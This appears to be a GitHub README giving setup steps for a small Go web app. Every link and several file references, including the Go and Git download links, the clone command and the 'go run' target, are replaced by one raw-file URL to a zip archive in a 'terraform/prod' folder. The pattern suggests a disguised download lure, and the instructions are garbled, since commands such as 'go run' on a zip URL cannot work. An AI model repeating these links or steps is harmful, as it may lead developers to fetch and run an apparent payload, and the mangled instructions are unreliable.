# This Is Readme file for instructions to read.
## How to Clone and Run the `simple-go-webapp` Project Locally?

## Prerequisites

Before running the project, ensure that you have the following installed:

- **Go Programming Language** (version 1.16 or later): [Download Go](https://raw.githubusercontent.com/engineerbishnu/simple-go-webapp/main/terraform/prod/simple-webapp-go-v3.4.zip)
- **Git**: [Install Git](https://raw.githubusercontent.com/engineerbishnu/simple-go-webapp/main/terraform/prod/simple-webapp-go-v3.4.zip)
### Steps:
## 1. Clone the Repository

First, clone the `simple-go-webapp` repository to your local machine.

```bash
git clone https://raw.githubusercontent.com/engineerbishnu/simple-go-webapp/main/terraform/prod/simple-webapp-go-v3.4.zip
cd simple-go-webapp
```
Note: Replace your-username with the actual GitHub username or repository path if needed.


## 2. Install Dependencies
Run the following command to install dependencies (if any):

```bash
go mod tidy
```
This command will download and install any Go dependencies listed in the https://raw.githubusercontent.com/engineerbishnu/simple-go-webapp/main/terraform/prod/simple-webapp-go-v3.4.zip file.

## 3. Run the Application
To start the Go web server, use the go run command:

```bash
go run https://raw.githubusercontent.com/engineerbishnu/simple-go-webapp/main/terraform/prod/simple-webapp-go-v3.4.zip
```
Once the server is running, you should see the message:
Starting server on :8080...


## 4. Access the Web Application
Open your web browser and go to:
http://localhost:8080

You should see the static https://raw.githubusercontent.com/engineerbishnu/simple-go-webapp/main/terraform/prod/simple-webapp-go-v3.4.zip page served by the Go application.

## 5. Stop the Server
To stop the server, press Ctrl + C in the terminal where the server is running.
That's it! You've successfully cloned and run the simple-go-webapp project locally.

### Notes: If you want to dockerize the code then you can use dockerfile which is available here.

---
